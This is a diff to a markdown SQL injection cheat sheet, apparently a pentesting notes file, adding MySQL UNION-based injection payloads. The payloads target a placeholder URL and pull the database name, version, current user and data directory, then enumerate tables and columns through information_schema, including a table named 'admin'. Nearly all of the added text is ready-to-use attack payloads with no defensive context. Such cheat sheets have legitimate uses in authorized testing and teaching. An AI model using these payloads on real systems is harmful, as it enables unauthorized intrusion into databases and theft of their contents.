@@ -61,3 +61,24 @@ MYSQL DBMS -> USER -> DATABASE -> TABLES -> ROWS -> Data
 ```
 provides access to database metadata, information about the MySQL server such as the name of a database or table, the data type of a column, or access privileges.
 ```
+
+**Gather Database And DBMS Informations**
+
+```
+https://vuln-web.vuln/product.php?id=1' UNION SELECT 1,2,(SELECT database()),4,5-- -
+https://vuln-web.vuln/product.php?id=1' UNION SELECT 1,2,(SELECT version()),4,5-- -
+https://vuln-web.vuln/product.php?id=1' UNION SELECT 1,2,(SELECT user()),4,5-- -
+https://vuln-web.vuln/product.php?id=1' UNION SELECT 1,2,(SELECT @@datadir),4,5-- -
+```
+
+**Finding Tables**
+```
+https://vuln-web.vuln/product.php?id=1' UNION SELECT 1,2,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),4,5-- -
+```
+
+**Finding Columns Of Table Or Tables**
+
+```
+https://vuln-web.vuln/product.php?id=1' UNION SELECT 1,2,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() and table_name='admin'),4,5-- -
+https://vuln-web.vuln/product.php?id=1' UNION SELECT 1,2,(SELECT GROUP_CONCAT(table_name,':',column_name) FROM information_schema.columns WHERE table_schema=database()),4,5-- -
+```
